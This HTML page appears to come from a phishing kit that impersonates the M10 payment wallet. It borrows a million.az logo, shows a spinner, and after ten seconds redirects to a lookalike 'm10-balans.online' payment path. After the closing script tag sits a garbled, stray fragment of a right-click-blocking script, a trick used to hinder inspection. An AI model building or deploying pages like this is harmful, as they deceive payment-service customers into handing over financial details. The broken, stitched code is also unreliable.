<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M10</title>
    <style>
        body {
            background-image: url('images/background.html'); /* Arka plan resmi yolunu buraya ekleyin */
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        h1 {
            color: white;
        }

        #logo {
            margin-top: -50px; /* Logo yukarı taşınacak mesafe */
        }

        /* Dönen daire animasyonu */
        .loader {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <div id="logo">
        <img src="https://million.az/logo/main-logo.svg" alt="Logo" width="200">
    </div>
    <h1></h1>

    <div class="loader"></div>

    <script>
        // Pencereyi büyüt
        window.onload = function () {
            // Pencereyi %55 büyüt
            window.resizeTo(window.innerWidth * 0.55, window.innerHeight * 0.55);
        };

        // 10 saniye (10000 milisaniye) bekleyip sonra yönlendirme yap
        setTimeout(function () {
            window.location.href = "../../../m10-balans.online/number/pay/index1.html"; // Yönlendirme işlemi
        }, 10000);
    </script>

        }
        var isNS = (navigator.appName == "Netscape") ? 1 : 0;
        var EnableRightClick = 0;
        if (isNS)
            document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);

        function mischandler() {

            if (EnableRightClick == 1) {
                return true;

</body>

</html>
